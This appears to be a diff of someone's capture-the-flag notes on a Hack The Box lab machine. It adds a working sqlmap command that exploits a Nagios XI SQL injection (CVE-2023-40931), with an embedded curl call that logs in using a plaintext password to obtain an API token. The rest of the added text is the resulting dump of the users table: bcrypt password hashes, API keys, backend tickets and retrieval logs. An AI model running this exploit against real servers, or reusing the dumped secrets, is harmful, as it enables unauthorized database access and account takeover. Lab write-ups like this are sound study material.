@@ -86,6 +86,58 @@ gave the hash to john:
 didnt find anything but this might be the password itself
 
 https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567
-    
 
+ sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'" --level 5 --risk 3 -p id --batch -D nagiosxi --dump 
+ 
+   
++---------+------------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+| user_id | email                  | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
++---------+------------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+| 1       | admin@monitored.htb    | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 1707121535   | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 1              | 1701427555           |
+| 2       | svc@monitored.htb      | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1707162147   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 13             | 1699697433           |
+| 6       | chiva@localhost        | chiva                | 3Xm3E5KZOVcKlbir5lHduXPbm7h74gmJgse2LbKJAW2ruKchEDj4s098SphZ8HT8 | 1       | $2a$10$aba7ccde2b8ec36eb3b15OXYxlG/EKlqyyBYZqODAw8LlC0eOy/iS | chiva       | 0          | 1707102967 | 0           | 0           | 0            | 0            | PhLNV5k8IeTmbrbsvXQ7pEGCXOPQkCt4flJrOiCmQGHFeYI5HFtoTT2PuvH44ooQ | 0              | 0              | 1707103009           |
+| 7       | chiva@localhost        | chiva                | kB6HjmdKfvvFtZ5FXcS0ai6WEevGKD5vou4iPku0pqaE6ga9mkiv5O3kjnjqBshp | 1       | $2a$10$0a3556d393ca15015e170uHyDNTFrBPL8U1NDlBnfcIeAzyh6P0yW | admin       | 0          | 1707103410 | 0           | 0           | 0            | 1707156342   | F9jlA7ZPGud5jOXb2Rm8WSF6MKcN4q44VEYeFYWE4lDslHcDKKq3v8JMFJYiSGHD | 0              | 1              | 1707103424           |
+| 8       | geto@localhost         | Sukuna               | KfXQ9Ns53INSnGqcb2e4pj2pRMIb92BEfFRQHv7WgBnq2fnjZ8CBiIYrkRSt5WjA | 1       | $2a$10$6b2e6cdd256e29087881cuBSw6g4I/SrhR1VGUxzm5r5PK6B8XFtu | suguru      | 0          | 1707132140 | 0           | 0           | 0            | 0            | 5XQYZKlNf7FUJoBCCJqnuU2h3SeiPljMsqN7K5XZ64HEhDBklnNNbcL0HU8gvb9C | 0              | 0              | 1707127096           |
+| 9       | newadmin@monitored.htb | nadmin               | u9UlbJlXVTJEi7Y4uYmd8OUNQ6BL2X0FmJbGLPm97qDrnafX92cQIgCMS2AIPPLd | 1       | $2a$10$d630927e62cdb4a74129dul1nQqVrxAG0rIAcbxLX9TtW.fOD6qRG | nadmin      | 0          | 1707131568 | 0           | 0           | 0            | 0            | mk0QC8dMlYDJcTauGAvliDjkle0Wpf59tBUWkXOnVnXjTFrF3DAm3qkdVbTlmGRN | 0              | 0              | 1707131589           |
+| 10      | dog@monitored.htb      | Dog                  | JWio68kSJGURCXAPQ2kOsIgp29ANl6S4iA3V9LsNU9U0qUuFcvXZ8s5ACNCAW8U6 | 1       | $2a$10$7b214459132eab335523cO3XLxPXzZZcVLYTQc/bYF07704ccL4m2 | dog         | 0          | 1707157412 | 0           | 0           | 0            | 0            | E3oTAjXhRngFMshEPrV0bZS89jC4Im63ASiuels0eAcd9A3Zmp34UQGnEicfoGXQ | 0              | 0              | 1707157428           |
++---------+------------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
 
+[20:21:45] [INFO] fetching entries for table 'xi_users' in database 'nagiosxi'
+[20:21:46] [INFO] retrieved: 'Nagios Administrator'
+[20:21:46] [INFO] retrieved: '1'
+[20:21:47] [INFO] retrieved: 'IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'
+[20:21:47] [INFO] retrieved: 'IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0'
+[20:21:47] [INFO] retrieved: '0'
+[20:21:48] [INFO] retrieved: '0'
+[20:21:48] [INFO] retrieved: 'admin@monitored.htb'
+[20:21:48] [INFO] retrieved: '1'
+[20:21:49] [INFO] retrieved: '1707121535'
+[20:21:49] [INFO] retrieved: '1701427555'
+[20:21:49] [INFO] retrieved: '5'
+[20:21:49] [INFO] retrieved: '1701931372'
+[20:21:50] [INFO] retrieved: '1701427555'
+[20:21:50] [INFO] retrieved: '1'
+[20:21:51] [INFO] retrieved: '$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C'
+[20:21:51] [INFO] retrieved: '1'
+[20:21:51] [INFO] retrieved: 'nagiosadmin'
+[20:21:52] [INFO] retrieved: 'svc'
+[20:21:52] [INFO] retrieved: '1'
+[20:21:53] [INFO] retrieved: '2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK'
+[20:21:53] [INFO] retrieved: '6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq'
+[20:21:54] [INFO] retrieved: '1'
+[20:21:54] [INFO] retrieved: '1699634403'
+[20:21:54] [INFO] retrieved: 'svc@monitored.htb'
+[20:21:55] [INFO] retrieved: '0'
+[20:21:55] [INFO] retrieved: '1707162147'
+[20:21:55] [INFO] retrieved: '1699728200'
+[20:21:56] [INFO] retrieved: '1'
+[20:21:56] [INFO] retrieved: '1699724476'
+[20:21:56] [INFO] retrieved: '1699697433'
+[20:21:57] [INFO] retrieved: '13'
+[20:21:57] [INFO] retrieved: '$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK'
+[20:21:57] [INFO] retrieved: '2'
+[20:21:58] [INFO] retrieved: 'svc'
+[20:21:58] [INFO] retrieved: 'chiva'
+[20:21:58] [INFO] retrieved: '0'
+[20:21:59] [INFO] retrieved: '3Xm3E5KZOVcKlbir5lHduXPbm7h74gmJgse2LbKJAW2ruKchEDj4s098SphZ8HT8'
+[20:22:00] [INFO] retrieved: 'PhLNV5k8IeTmbrbsvXQ7pEGCXOPQkCt4flJrOiCmQGHFeYI5HFtoTT2PuvH44ooQ'
